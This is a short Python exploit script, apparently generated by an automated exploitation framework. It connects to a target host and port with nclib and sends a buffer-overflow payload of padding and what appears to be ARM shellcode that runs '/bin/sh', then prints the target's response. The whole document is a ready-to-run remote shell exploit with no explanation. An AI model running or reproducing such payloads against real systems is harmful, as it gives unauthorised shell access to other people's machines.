#!/usr/bin/env python

import sys
import socket
import time
import argparse

import nclib

parser = argparse.ArgumentParser(description="Launch exploit.")
parser.add_argument('host', type=str)
parser.add_argument('port', type=int)
parser.add_argument('-c', '--cmd', nargs="*", type=str)

args = parser.parse_args()

############## render actions #################
# RexOpenChannelAction
r = nclib.Netcat((args.host, args.port), udp=False, verbose=True)


# RexSendAction
r.send(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x14\x04\x01\x00\x0c\x00\x8f\xe2\x00 \xa0\xe3\x05\x00-\xe9\r\x10\xa0\xe1\x0b\x00\x90\xef/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

print(r.recvall())
